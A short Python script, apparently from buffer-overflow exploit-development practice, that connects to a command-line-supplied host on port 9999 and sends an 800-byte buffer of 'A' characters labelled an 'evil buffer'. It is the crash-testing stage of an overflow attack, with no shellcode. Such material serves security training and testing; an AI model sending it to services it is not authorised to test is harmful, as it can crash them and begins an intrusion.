#!/usr/bin/python
import socket
import sys

server = sys.argv[1]
port = 9999

prefix = b''
size = 800

filler = b"A" * size

payload = prefix + filler

try:
  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(payload)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
